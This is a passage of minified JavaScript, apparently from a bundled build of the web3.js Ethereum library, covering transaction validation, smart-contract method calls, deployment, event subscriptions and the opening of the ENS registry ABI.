                return GO(this, t, n)
            })
        }
        getFilterLogs(t, n = this.defaultReturnFormat) {
            return se(this, void 0, void 0, function*() {
                return VO(this, t, n)
            })
        }
    }
    const WO = e => {
            if (!N(e.common)) {
                if (N(e.common.customChain)) throw new z4;
                if (N(e.common.customChain.chainId)) throw new G4;
                if (!N(e.chainId) && e.chainId !== e.common.customChain.chainId) throw new V4({
                    txChainId: e.chainId,
                    customChainId: e.common.customChain.chainId
                })
            }
        },
        qO = e => {
            if (!N(e.common) && !N(e.chain) && !N(e.hardfork)) throw new Q4;
            if (!N(e.chain) && N(e.hardfork) || !N(e.hardfork) && N(e.chain)) throw new K4({
                chain: e.chain,
                hardfork: e.hardfork
            })
        },
        QO = e => {
            if (!N(e.common) && !N(e.common.baseChain) && !N(e.chain) && e.chain !== e.common.baseChain) throw new W4({
                txChain: e.chain,
                baseChain: e.common.baseChain
            })
        },
        KO = e => {
            if (!N(e.common) && !N(e.common.hardfork) && !N(e.hardfork) && e.hardfork !== e.common.hardfork) throw new q4({
                txHardfork: e.hardfork,
                commonHardfork: e.common.hardfork
            })
        },
        t1 = e => {
            if (N(e.gas) || !_r(e.gas) || N(e.gasPrice) || !_r(e.gasPrice)) throw new eP({
                gas: e.gas,
                gasPrice: e.gasPrice
            });
            if (!N(e.maxFeePerGas) || !N(e.maxPriorityFeePerGas)) throw new Hx({
                maxFeePerGas: e.maxFeePerGas,
                maxPriorityFeePerGas: e.maxPriorityFeePerGas
            })
        },
        n1 = e => {
            if (!N(e.gasPrice) && e.type === "0x2") throw new nP(e.gasPrice);
            if (e.type === "0x0" || e.type === "0x1") throw new Hx({
                maxFeePerGas: e.maxFeePerGas,
                maxPriorityFeePerGas: e.maxPriorityFeePerGas
            });
            if (N(e.maxFeePerGas) || !_r(e.maxFeePerGas) || N(e.maxPriorityFeePerGas) || !_r(e.maxPriorityFeePerGas)) throw new tP({
                maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                maxFeePerGas: e.maxFeePerGas
            })
        },
        ZO = e => {
            const t = !N(e.gas) || !N(e.gasLimit),
                n = t && !N(e.gasPrice),
                r = t && !N(e.maxPriorityFeePerGas) && !N(e.maxFeePerGas);
            if (!n && !r) throw new Y4({
                gas: e.gas,
                gasPrice: e.gasPrice,
                maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                maxFeePerGas: e.maxFeePerGas
            });
            if (n && r) throw new X4({
                gas: e.gas,
                gasPrice: e.gasPrice,
                maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                maxFeePerGas: e.maxFeePerGas
            });
            (n ? t1 : n1)(e), (!N(e.type) && e.type > "0x1" ? n1 : t1)(e)
        },
        YO = (e, t, n = {
            transactionSchema: void 0
        }) => {
            if (!N(t)) {
                t(e);
                return
            }
            if (typeof e != "object" || N(e)) throw new rP(e);
            WO(e), qO(e), QO(e), KO(e);
            const r = Ht(e, oe, {
                transactionSchema: n.transactionSchema
            });
            if (ZO(r), N(r.nonce) || N(r.chainId) || r.nonce.startsWith("-") || r.chainId.startsWith("-")) throw new iP({
                nonce: e.nonce,
                chainId: e.chainId
            })
        };
    var JO = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const XO = e => {
            var t, n;
            return Object.assign(Object.assign({}, e), {
                nonce: e.nonce,
                gasPrice: e.gasPrice,
                gasLimit: (t = e.gasLimit) !== null && t !== void 0 ? t : e.gas,
                to: e.to,
                value: e.value,
                data: (n = e.data) !== null && n !== void 0 ? n : e.input,
                type: e.type,
                chainId: e.chainId,
                accessList: e.accessList,
                maxPriorityFeePerGas: e.maxPriorityFeePerGas,
                maxFeePerGas: e.maxFeePerGas
            })
        },
        e9 = (e, t) => {
            var n, r, i, o, s, a, l, u, c, d, f, h, v, p, w, m, g, y;
            const x = !N(e.chain) && !N(e.hardfork) || !N(e.common);
            let E;
            if (!x) t.defaultCommon ? (E = Object.assign({}, t.defaultCommon), N(E.hardfork) && (E.hardfork = (n = e.hardfork) !== null && n !== void 0 ? n : t.defaultHardfork), N(E.baseChain) && (E.baseChain = t.defaultChain)) : E = qe.custom({
                name: "custom-network",
                chainId: Ot(e.chainId),
                networkId: N(e.networkId) ? void 0 : Ot(e.networkId),
                defaultHardfork: (r = e.hardfork) !== null && r !== void 0 ? r : t.defaultHardfork
            }, {
                baseChain: t.defaultChain
            });
            else {
                const k = (a = (s = (o = (i = e == null ? void 0 : e.common) === null || i === void 0 ? void 0 : i.customChain) === null || o === void 0 ? void 0 : o.name) !== null && s !== void 0 ? s : e.chain) !== null && a !== void 0 ? a : "custom-network",
                    I = Ot((c = (u = (l = e == null ? void 0 : e.common) === null || l === void 0 ? void 0 : l.customChain) === null || u === void 0 ? void 0 : u.chainId) !== null && c !== void 0 ? c : e == null ? void 0 : e.chainId),
                    _ = Ot((h = (f = (d = e == null ? void 0 : e.common) === null || d === void 0 ? void 0 : d.customChain) === null || f === void 0 ? void 0 : f.networkId) !== null && h !== void 0 ? h : e == null ? void 0 : e.networkId),
                    L = (w = (p = (v = e == null ? void 0 : e.common) === null || v === void 0 ? void 0 : v.hardfork) !== null && p !== void 0 ? p : e == null ? void 0 : e.hardfork) !== null && w !== void 0 ? w : t.defaultHardfork,
                    C = (y = (g = (m = e.common) === null || m === void 0 ? void 0 : m.baseChain) !== null && g !== void 0 ? g : e.chain) !== null && y !== void 0 ? y : t.defaultChain;
                I && _ && k && (E = qe.custom({
                    name: k,
                    chainId: I,
                    networkId: _,
                    defaultHardfork: L
                }, {
                    baseChain: C
                }))
            }
            return {
                common: E
            }
        },
        t9 = (e, t, n, r = !1, i = !0) => JO(void 0, void 0, void 0, function*() {
            const o = yield CM({
                transaction: e,
                web3Context: t,
                privateKey: n,
                fillGasPrice: r,
                fillGasLimit: i
            }), s = Ht(o, oe, {
                transactionSchema: t.config.customTransactionSchema
            });
            return YO(s, void 0, {
                transactionSchema: t.config.customTransactionSchema
            }), po.fromTxData(XO(s), e9(s, t))
        }),
        r1 = ({
            address: e
        }, t, n) => {
            var r, i;
            const o = n == null ? void 0 : n.topics,
                s = (r = n == null ? void 0 : n.filter) !== null && r !== void 0 ? r : {},
                a = {};
            if (X(n == null ? void 0 : n.fromBlock) || (a.fromBlock = D(Ju.properties.number, n == null ? void 0 : n.fromBlock, {
                    number: dn.HEX,
                    bytes: Er.HEX
                })), X(n == null ? void 0 : n.toBlock) || (a.toBlock = D(Ju.properties.number, n == null ? void 0 : n.toBlock, {
                    number: dn.HEX,
                    bytes: Er.HEX
                })), o && Array.isArray(o)) a.topics = [...o];
            else if (a.topics = [], t && !t.anonymous && ![Ts, "allEvents"].includes(t.name) && a.topics.push((i = t.signature) !== null && i !== void 0 ? i : cg(vr(t))), ![Ts, "allEvents"].includes(t.name) && t.inputs)
                for (const l of t.inputs) {
                    if (!l.indexed) continue;
                    const u = s[l.name];
                    if (!u) {
                        a.topics.push(null);
                        continue
                    }
                    Array.isArray(u) ? a.topics.push(u.map(c => Yp(l.type, c))) : l.type === "string" ? a.topics.push(xs(u)) : a.topics.push(Yp(l.type, u))
                }
            return a.topics.length || delete a.topics, e && (a.address = e.toLowerCase()), a
        },
        Na = (e, t, n) => {
            const r = Array.isArray(e.inputs) ? e.inputs.length : 0;
            if (e.inputs && r !== t.length) throw new _t(`The number of arguments is not matching the methods required number. You need to pass ${r} arguments.`);
            let i;
            if (e.inputs ? i = uf(Array.isArray(e.inputs) ? e.inputs : [], t).replace("0x", "") : i = hO(t).replace("0x", ""), OM(e)) {
                if (!n) throw new _t("The contract has no contract data option set. This is necessary to append the constructor parameters.");
                return n.startsWith("0x") ? `${n}${i}` : `0x${n}${i}`
            }
            return `${El(e)}${i}`
        };
    class h2 extends Vl {
        constructor(t, n) {
            super(t, n), this.address = t.address, this.topics = t.topics, this.abi = t.abi, this.jsonInterface = t.jsonInterface
        }
        _buildSubscriptionParams() {
            return ["logs", {
                address: this.address,
                topics: this.topics
            }]
        }
        formatSubscriptionResult(t) {
            return hg(this.abi, t, this.jsonInterface, super.returnFormat)
        }
    }
    Array.from({
        length: 256
    }, (e, t) => t.toString(16).padStart(2, "0"));
    const ff = (e, t, n, r) => {
            var i, o;
            const s = {};
            return (!X(e.data) || r === "both") && (s.data = Na(t, n, (i = e.data) !== null && i !== void 0 ? i : e.input)), (!X(e.input) || r === "both") && (s.input = Na(t, n, (o = e.input) !== null && o !== void 0 ? o : e.data)), X(s.input) && X(s.data) && (s[r] = Na(t, n)), {
                data: s.data,
                input: s.input
            }
        },
        em = ({
            abi: e,
            params: t,
            options: n,
            contractOptions: r
        }) => {
            var i, o, s;
            if (!((s = (o = (i = n == null ? void 0 : n.input) !== null && i !== void 0 ? i : n == null ? void 0 : n.data) !== null && o !== void 0 ? o : r.input) !== null && s !== void 0 ? s : r.data) && !(n != null && n.to) && !r.address) throw new _t("Contract address not specified");
            if (!(n != null && n.from) && !r.from) throw new _t('Contract "from" address not specified');
            let l = yi({
                to: r.address,
                gas: r.gas,
                gasPrice: r.gasPrice,
                from: r.from,
                input: r.input,
                maxPriorityFeePerGas: r.maxPriorityFeePerGas,
                maxFeePerGas: r.maxFeePerGas,
                data: r.data
            }, n);
            const u = ff(l, e, t, n == null ? void 0 : n.dataInputFill);
            return l = Object.assign(Object.assign({}, l), {
                data: u.data,
                input: u.input
            }), l
        },
        n9 = ({
            abi: e,
            params: t,
            options: n,
            contractOptions: r
        }) => {
            if (!(n != null && n.to) && !r.address) throw new _t("Contract address not specified");
            let i = yi({
                to: r.address,
                gas: r.gas,
                gasPrice: r.gasPrice,
                from: r.from,
                input: r.input,
                maxPriorityFeePerGas: r.maxPriorityFeePerGas,
                maxFeePerGas: r.maxFeePerGas,
                data: r.data
            }, n);
            const o = ff(i, e, t, n == null ? void 0 : n.dataInputFill);
            return i = Object.assign(Object.assign({}, i), {
                data: o.data,
                input: o.input
            }), i
        },
        r9 = ({
            abi: e,
            params: t,
            options: n,
            contractOptions: r
        }) => {
            let i = yi({
                to: r.address,
                gas: r.gas,
                gasPrice: r.gasPrice,
                from: r.from,
                input: r.input,
                data: r.data
            }, n);
            const o = ff(i, e, t, n == null ? void 0 : n.dataInputFill);
            return i = Object.assign(Object.assign({}, i), {
                data: o.data,
                input: o.input
            }), i
        },
        i1 = e => typeof e == "object" && !X(e) && Object.keys(e).length !== 0 && !Gr(e),
        i9 = ({
            abi: e,
            params: t,
            options: n,
            contractOptions: r
        }) => {
            if (!(n != null && n.to) && !r.address) throw new _t("Contract address not specified");
            if (!(n != null && n.from) && !r.from) throw new _t('Contract "from" address not specified');
            let i = yi({
                to: r.address,
                gas: r.gas,
                gasPrice: r.gasPrice,
                from: r.from,
                input: r.input,
                maxPriorityFeePerGas: r.maxPriorityFeePerGas,
                maxFeePerGas: r.maxFeePerGas,
                data: r.data
            }, n);
            const o = ff(i, e, t, n == null ? void 0 : n.dataInputFill);
            return i = Object.assign(Object.assign({}, i), {
                data: o.data,
                input: o.input
            }), i
        };
    var o9 = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class s9 {
        constructor(t, n) {
            this.parent = t, this.deployOptions = n;
            const {
                args: r,
                abi: i,
                contractOptions: o,
                deployData: s
            } = this.calculateDeployParams();
            this.args = r, this.constructorAbi = i, this.contractOptions = o, this.deployData = s
        }
        _contractMethodDeploySend(t) {
            const n = {
                transactionResolver: r => {
                    if (r.status === BigInt(0)) throw new _t("code couldn't be stored", r);
                    const i = this.parent.clone();
                    return i.options.address = r.contractAddress, i
                },
                contractAbi: this.parent.options.jsonInterface,
                checkRevertBeforeSending: !1
            };
            return N(this.parent.getTransactionMiddleware()) ? Al(this.parent, t, this.parent.defaultReturnFormat, n) : Al(this.parent, t, this.parent.defaultReturnFormat, n, this.parent.getTransactionMiddleware())
        }
        send(t) {
            const n = Object.assign({}, t),
                r = this.populateTransaction(n);
            return this._contractMethodDeploySend(r)
        }
        populateTransaction(t) {
            var n, r;
            const i = Object.assign(Object.assign({}, this.contractOptions), {
                    from: (r = (n = this.contractOptions.from) !== null && n !== void 0 ? n : this.parent.defaultAccount) !== null && r !== void 0 ? r : void 0
                }),
                o = em({
                    abi: this.constructorAbi,
                    params: this.args,
                    options: Object.assign(Object.assign({}, t), {
                        dataInputFill: this.parent.contractDataInputFill
                    }),
                    contractOptions: i
                });
            return o.dataInputFill && delete o.dataInputFill, o
        }
        calculateDeployParams() {
            var t, n, r, i, o, s;
            let a = this.parent.options.jsonInterface.find(h => h.type === "constructor");
            a || (a = {
                type: "constructor",
                stateMutability: ""
            });
            const l = D({
                    format: "bytes"
                }, (n = (t = this.deployOptions) === null || t === void 0 ? void 0 : t.input) !== null && n !== void 0 ? n : this.parent.options.input, At),
                u = D({
                    format: "bytes"
                }, (i = (r = this.deployOptions) === null || r === void 0 ? void 0 : r.data) !== null && i !== void 0 ? i : this.parent.options.data, At);
            if ((!l || l.trim() === "0x") && (!u || u.trim() === "0x")) throw new _t("contract creation without any data provided.");
            const c = (s = (o = this.deployOptions) === null || o === void 0 ? void 0 : o.arguments) !== null && s !== void 0 ? s : [],
                d = Object.assign(Object.assign({}, this.parent.options), {
                    input: l,
                    data: u
                });
            return {
                args: c,
                abi: a,
                contractOptions: d,
                deployData: l ?? u
            }
        }
        estimateGas(t, n = this.parent.defaultReturnFormat) {
            return o9(this, void 0, void 0, function*() {
                const r = Object.assign({}, t);
                return this.parent.contractMethodEstimateGas({
                    abi: this.constructorAbi,
                    params: this.args,
                    returnFormat: n,
                    options: r,
                    contractOptions: this.contractOptions
                })
            })
        }
        encodeABI() {
            return Na(this.constructorAbi, this.args, D({
                format: "bytes"
            }, this.deployData, this.parent.defaultReturnFormat))
        }
        decodeData(t) {
            return Object.assign(Object.assign({}, Jp(this.constructorAbi, t.replace(this.deployData, ""), !1)), {
                __method__: this.constructorAbi.type
            })
        }
    }
    var a9 = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    class l9 extends qu {
        constructor(t, n) {
            super(t.requestManager, t.registeredSubscriptions), this.parentContract = n
        }
        subscribe(t, n, r = At) {
            const i = Object.create(null, {
                subscribe: {
                    get: () => super.subscribe
                }
            });
            return a9(this, void 0, void 0, function*() {
                return i.subscribe.call(this, t, n ?? this.parentContract.options, r)
            })
        }
    }
    var xi = function(e, t, n, r) {
        function i(o) {
            return o instanceof n ? o : new n(function(s) {
                s(o)
            })
        }
        return new(n || (n = Promise))(function(o, s) {
            function a(c) {
                try {
                    u(r.next(c))
                } catch (d) {
                    s(d)
                }
            }

            function l(c) {
                try {
                    u(r.throw(c))
                } catch (d) {
                    s(d)
                }
            }

            function u(c) {
                c.done ? o(c.value) : i(c.value).then(a, l)
            }
            u((r = r.apply(e, t || [])).next())
        })
    };
    const c9 = {
        logs: h2,
        newHeads: nd,
        newBlockHeaders: nd
    };
    class Ki extends Lt {
        constructor(t, n, r, i, o) {
            var s, a, l;
            const u = Gr(n) ? n : Gr(r) ? r : void 0;
            let c;
            i1(n) ? c = n : i1(r) ? c = r : c = i;
            let d;
            if (typeof n == "object" && "provider" in n ? d = n.provider : typeof r == "object" && "provider" in r ? d = r.provider : typeof i == "object" && "provider" in i ? d = i.provider : d = Ki.givenProvider, super(Object.assign(Object.assign({}, c), {
                    provider: d,
                    registeredSubscriptions: c9
                })), this.syncWithContext = !1, this._functions = {}, this._subscriptionManager = new l9(super.subscriptionManager, this), c != null && c.wallet && (this._wallet = c.wallet), c != null && c.accountProvider && (this._accountProvider = c.accountProvider), !N(u) && !N(u.data) && !N(u.input) && this.config.contractDataInputFill !== "both") throw new B4({
                data: u.data,
                input: u.input
            });
            this._overloadedMethodAbis = new Map;
            const f = cr(i) ? i : cr(r) ? r : o ?? this.defaultReturnFormat,
                h = typeof n == "string" ? n : void 0;
            this.config.contractDataInputFill = (s = u == null ? void 0 : u.dataInputFill) !== null && s !== void 0 ? s : this.config.contractDataInputFill, this._parseAndSetJsonInterface(t, f), this.defaultReturnFormat !== f && (this.defaultReturnFormat = f), N(h) || this._parseAndSetAddress(h, f), this.options = {
                address: h,
                jsonInterface: this._jsonInterface,
                gas: (a = u == null ? void 0 : u.gas) !== null && a !== void 0 ? a : u == null ? void 0 : u.gasLimit,
                gasPrice: u == null ? void 0 : u.gasPrice,
                from: u == null ? void 0 : u.from,
                input: u == null ? void 0 : u.input,
                data: u == null ? void 0 : u.data
            }, this.syncWithContext = (l = u == null ? void 0 : u.syncWithContext) !== null && l !== void 0 ? l : !1, c instanceof Lt && this.subscribeToContextEvents(c), Object.defineProperty(this.options, "address", {
                set: v => this._parseAndSetAddress(v, f),
                get: () => this._address
            }), Object.defineProperty(this.options, "jsonInterface", {
                set: v => this._parseAndSetJsonInterface(v, f),
                get: () => this._jsonInterface
            }), c instanceof Lt && c.on(fo.CONFIG_CHANGE, v => {
                this.setConfig({
                    [v.name]: v.newValue
                })
            })
        }
        get subscriptionManager() {
            return this._subscriptionManager
        }
        setTransactionMiddleware(t) {
            this.transactionMiddleware = t
        }
        getTransactionMiddleware() {
            return this.transactionMiddleware
        }
        get events() {
            return this._events
        }
        get methods() {
            return this._methods
        }
        clone() {
            let t;
            return this.options.address ? t = new Ki([...this._jsonInterface, ...this._errorsInterface], this.options.address, {
                gas: this.options.gas,
                gasPrice: this.options.gasPrice,
                from: this.options.from,
                input: this.options.input,
                data: this.options.data,
                provider: this.currentProvider,
                syncWithContext: this.syncWithContext,
                dataInputFill: this.config.contractDataInputFill
            }, this.getContextObject()) : t = new Ki([...this._jsonInterface, ...this._errorsInterface], {
                gas: this.options.gas,
                gasPrice: this.options.gasPrice,
                from: this.options.from,
                input: this.options.input,
                data: this.options.data,
                provider: this.currentProvider,
                syncWithContext: this.syncWithContext,
                dataInputFill: this.config.contractDataInputFill
            }, this.getContextObject()), this.context && t.subscribeToContextEvents(this.context), t
        }
        deploy(t) {
            return new s9(this, t)
        }
        getPastEvents(t, n, r) {
            var i;
            return xi(this, void 0, void 0, function*() {
                const o = typeof t == "string" ? t : Ts,
                    s = typeof t != "string" && !cr(t) ? t : cr(n) ? {} : n,
                    a = cr(t) ? t : cr(n) ? n : r ?? this.defaultReturnFormat,
                    l = o === "allEvents" || o === Ts ? Gp : this._jsonInterface.find(m => "name" in m && m.name === o);
                if (!l) throw new _t(`Event ${o} not found.`);
                const {
                    fromBlock: u,
                    toBlock: c,
                    topics: d,
                    address: f
                } = r1(this.options, l, s ?? {}), h = yield l2(this, {
                    fromBlock: u,
                    toBlock: c,
                    topics: d,
                    address: f
                }, a), v = h ? h.map(m => typeof m == "string" ? m : hg(l, m, this._jsonInterface, a)) : [], p = (i = s == null ? void 0 : s.filter) !== null && i !== void 0 ? i : {}, w = Object.keys(p);
                return w.length > 0 ? v.filter(m => typeof m == "string" ? !0 : w.every(g => {
                    var y;
                    if (Array.isArray(p[g])) return p[g].some(E => String(m.returnValues[g]).toUpperCase() === String(E).toUpperCase());
                    const x = (y = l.inputs) === null || y === void 0 ? void 0 : y.filter(E => E.name === g)[0];
                    return x != null && x.indexed && x.type === "string" && xs(p[g]) === String(m.returnValues[g]) ? !0 : String(m.returnValues[g]).toUpperCase() === String(p[g]).toUpperCase()
                })) : v
            })
        }
        _parseAndSetAddress(t, n = this.defaultReturnFormat) {
            this._address = t && Xn(D({
                format: "address"
            }, t, n))
        }
        decodeMethodData(t) {
            const n = t.slice(0, 10),
                i = this._jsonInterface.filter(o => o.type !== "error").find(o => n === El(vr(o)));
            if (!i) throw new _t(`The ABI for the provided method signature ${n} was not found.`);
            return Jp(i, t)
        }
        _parseAndSetJsonInterface(t, n = this.defaultReturnFormat) {
            var r, i, o, s, a;
            this._functions = {}, this._methods = {}, this._events = {};
            let l = [];
            const u = t.filter(d => d.type !== "error"),
                c = t.filter(d => lf(d));
            for (const d of u) {
                const f = Object.assign(Object.assign({}, d), {
                    signature: ""
                });
                if (cf(f)) {
                    const h = vr(f),
                        v = El(h);
                    f.methodNameWithInputs = h, f.signature = v, f.constant = (i = (r = f.stateMutability === "view") !== null && r !== void 0 ? r : f.stateMutability === "pure") !== null && i !== void 0 ? i : f.constant, f.payable = (o = f.stateMutability === "payable") !== null && o !== void 0 ? o : f.payable, this._overloadedMethodAbis.set(f.name, [...(s = this._overloadedMethodAbis.get(f.name)) !== null && s !== void 0 ? s : [], f]);
                    const p = (a = this._overloadedMethodAbis.get(f.name)) !== null && a !== void 0 ? a : [],
                        w = this._createContractMethod(p, c),
                        m = this._createContractMethod(p, c, !0);
                    this._functions[h] = {
                        signature: v,
                        method: m
                    }, this._methods[f.name] = w, this._methods[h] = m, this._methods[v] = m
                } else if (lg(f)) {
                    const h = vr(f),
                        v = cg(h),
                        p = this._createContractEvent(f, n);
                    f.signature = v, (!(h in this._events) || f.name === "bound") && (this._events[h] = p), this._events[f.name] = p, this._events[v] = p
                }
                l = [...l, f]
            }
            this._events.allEvents = this._createContractEvent(Gp, n), this._jsonInterface = [...l], this._errorsInterface = c
        }
        _getAbiParams(t, n) {
            var r;
            try {
                return Ra((r = t.inputs) !== null && r !== void 0 ? r : [], n)
            } catch (i) {
                throw new _t(`Invalid parameters for method ${t.name}: ${i.message}`)
            }
        }
        _createContractMethod(t, n, r = !1) {
            const i = t[t.length - 1];
            return (...o) => {
                var s, a, l;
                let u;
                const c = (a = r ? (s = this._overloadedMethodAbis.get(i.name)) === null || s === void 0 ? void 0 : s.filter(p => p.signature === i.signature) : this._overloadedMethodAbis.get(i.name)) !== null && a !== void 0 ? a : [];
                let d = c[0];
                const f = n,
                    h = c.filter(p => {
                        var w;
                        return ((w = p.inputs) !== null && w !== void 0 ? w : []).length === o.length
                    });
                if (c.length === 1 || h.length === 0) u = this._getAbiParams(d, o), Y.validate((l = i.inputs) !== null && l !== void 0 ? l : [], u);
                else {
                    const p = [],
                        w = [];
                    for (const m of h) try {
                        u = this._getAbiParams(m, o), Y.validate(m.inputs, u), w.push(m)
                    } catch (g) {
                        p.push(g)
                    }
                    if (w.length === 1 ? [d] = w : w.length > 1 && ([d] = w, console.warn(`Multiple methods found that is compatible with the given inputs.
	Found ${w.length} compatible methods: ${JSON.stringify(w.map(m=>`${m.methodNameWithInputs} (signature: ${m.signature})`))} 
	The first one will be used: ${d.methodNameWithInputs}`)), p.length === h.length) throw new ys(p)
                }
                const v = {
                    arguments: u,
                    call: (p, w) => xi(this, void 0, void 0, function*() {
                        return this._contractMethodCall(d, u, f, p, w)
                    }),
                    send: p => this._contractMethodSend(d, u, f, p),
                    populateTransaction: (p, w) => {
                        var m, g;
                        let y = w ?? this.options;
                        y = Object.assign(Object.assign({}, y), {
                            input: void 0,
                            from: (g = (m = y == null ? void 0 : y.from) !== null && m !== void 0 ? m : this.defaultAccount) !== null && g !== void 0 ? g : void 0
                        });
                        const x = em({
                            abi: i,
                            params: o,
                            options: Object.assign(Object.assign({}, p), {
                                dataInputFill: this.config.contractDataInputFill
                            }),
                            contractOptions: y
                        });
                        return x.dataInputFill && delete x.dataInputFill, x
                    },
                    estimateGas: (p, w = this.defaultReturnFormat) => xi(this, void 0, void 0, function*() {
                        return this.contractMethodEstimateGas({
                            abi: d,
                            params: u,
                            returnFormat: w,
                            options: p
                        })
                    }),
                    encodeABI: () => Na(d, u),
                    decodeData: p => Jp(d, p),
                    createAccessList: (p, w) => xi(this, void 0, void 0, function*() {
                        return this._contractMethodCreateAccessList(d, u, f, p, w)
                    })
                };
                return d.stateMutability === "payable", v
            }
        }
        _contractMethodCall(t, n, r, i, o) {
            var s;
            return xi(this, void 0, void 0, function*() {
                const a = n9({
                    abi: t,
                    params: n,
                    options: Object.assign(Object.assign({}, i), {
                        dataInputFill: this.config.contractDataInputFill
                    }),
                    contractOptions: Object.assign(Object.assign({}, this.options), {
                        from: (s = this.options.from) !== null && s !== void 0 ? s : this.config.defaultAccount
                    })
                });
                try {
                    const l = yield gg(this, a, o, this.defaultReturnFormat);
                    return mO(t, l)
                } catch (l) {
                    throw l instanceof Gi && Fc(r, l.cause), l
                }
            })
        }
        _contractMethodCreateAccessList(t, n, r, i, o) {
            var s;
            return xi(this, void 0, void 0, function*() {
                const a = i9({
                    abi: t,
                    params: n,
                    options: Object.assign(Object.assign({}, i), {
                        dataInputFill: this.config.contractDataInputFill
                    }),
                    contractOptions: Object.assign(Object.assign({}, this.options), {
                        from: (s = this.options.from) !== null && s !== void 0 ? s : this.config.defaultAccount
                    })
                });
                try {
                    return u2(this, a, o, this.defaultReturnFormat)
                } catch (l) {
                    throw l instanceof Gi && Fc(r, l.cause), l
                }
            })
        }
        _contractMethodSend(t, n, r, i, o) {
            var s, a;
            let l = o ?? this.options;
            l = Object.assign(Object.assign({}, l), {
                input: void 0,
                from: (a = (s = l.from) !== null && s !== void 0 ? s : this.defaultAccount) !== null && a !== void 0 ? a : void 0
            });
            const u = em({
                    abi: t,
                    params: n,
                    options: Object.assign(Object.assign({}, i), {
                        dataInputFill: this.config.contractDataInputFill
                    }),
                    contractOptions: l
                }),
                c = N(this.transactionMiddleware) ? Al(this, u, this.defaultReturnFormat, {
                    checkRevertBeforeSending: !1,
                    contractAbi: this._jsonInterface
                }) : Al(this, u, this.defaultReturnFormat, {
                    checkRevertBeforeSending: !1,
                    contractAbi: this._jsonInterface
                }, this.transactionMiddleware);
            return c.on("error", d => {
                d instanceof Gi && Fc(r, d.cause)
            }), c
        }
        contractMethodEstimateGas({
            abi: t,
            params: n,
            returnFormat: r,
            options: i,
            contractOptions: o
        }) {
            return xi(this, void 0, void 0, function*() {
                const s = r9({
                    abi: t,
                    params: n,
                    options: Object.assign(Object.assign({}, i), {
                        dataInputFill: this.config.contractDataInputFill
                    }),
                    contractOptions: o ?? this.options
                });
                return vg(this, s, ur.LATEST, r ?? this.defaultReturnFormat)
            })
        }
        _createContractEvent(t, n = this.defaultReturnFormat) {
            return (...r) => {
                var i;
                const {
                    topics: o,
                    fromBlock: s
                } = r1(this.options, t, r[0]), a = new h2({
                    address: this.options.address,
                    topics: o,
                    abi: t,
                    jsonInterface: this._jsonInterface
                }, {
                    subscriptionManager: this.subscriptionManager,
                    returnFormat: n
                });
                return N(s) || this.getPastEvents(t.name, {
                    fromBlock: s,
                    topics: o
                }, n).then(l => {
                    l && l.forEach(u => a.emit("data", u))
                }).catch(l => {
                    a.emit("error", new ar("Failed to get past events.", l))
                }), (i = this.subscriptionManager) === null || i === void 0 || i.addSubscription(a).catch(l => {
                    a.emit("error", new ar("Failed to subscribe.", l))
                }), a
            }
        }
        subscribeToContextEvents(t) {
            const n = this;
            this.context = t, n.syncWithContext && t.on(fo.CONFIG_CHANGE, r => {
                n.setConfig({
                    [r.name]: r.newValue
                })
            })
        }
    }
    const o1 = {
            addr: "0x3b3b57de",
            name: "0x691f3431",
            abi: "0x2203ab56",
            pubkey: "0xc8690233",
            text: "0x59d1d43c",
            contenthash: "0xbc1c58d1"
        },
        To = {
            setAddr: "addr",
            addr: "addr",
            setPubkey: "pubkey",
            pubkey: "pubkey",
            setContenthash: "contenthash",
            contenthash: "contenthash",
            text: "text",
            name: "name"
        },
        rd = {
            main: "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",
            goerli: "0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e"
        },
        u9 = {
            "0x1": "main",
            "0x5": "goerli"
        },
        d9 = [{
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !0,
                internalType: "bytes32",
                name: "label",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "address",
                name: "owner",
                type: "address"
            }],
            name: "NewOwner",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "address",
                name: "resolver",
                type: "address"
            }],
            name: "NewResolver",
            type: "event"
        }, {
            anonymous: !1,
            inputs: [{
                indexed: !0,
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }, {
                indexed: !1,
                internalType: "address",
                name: "owner",
                type: "address"
            }],
            name: "Transfer",
            type: "event"
        }, {
            inputs: [{
                internalType: "address",
                name: "owner",
                type: "address"
            }, {
                internalType: "address",
                name: "operator",
                type: "address"
            }],
            name: "isApprovedForAll",
            outputs: [{
                internalType: "bool",
                name: "",
                type: "bool"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
                name: "node",
                type: "bytes32"
            }],
            name: "owner",
            outputs: [{
                internalType: "address",
                name: "",
                type: "address"
            }],
            stateMutability: "view",
            type: "function"
        }, {
            inputs: [{
                internalType: "bytes32",
